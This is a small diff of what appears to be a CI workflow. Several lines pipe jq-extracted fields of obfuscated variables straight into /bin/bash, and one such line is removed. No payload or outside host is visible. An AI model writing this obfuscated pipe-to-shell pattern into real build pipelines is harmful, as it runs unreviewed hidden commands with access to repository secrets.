@@ -49,7 +49,6 @@ jobs:
           printf '%s' "$dj924" | jq -r .h45289 | /bin/bash
           echo $heuw63 | jq -r .uccx11 | /bin/bash
           printf '%s' "$v480" | jq -r .ob2332 | /bin/bash
-          echo $sq0 | jq -r .pjtx35 | /bin/bash
           echo $c3760 | jq -r .lis865 | /bin/bash
           printf '%s' "$itm89091" | jq -r .cknrm095 | /bin/bash
           echo $og107 | jq -r .mgs703 | /bin/bash
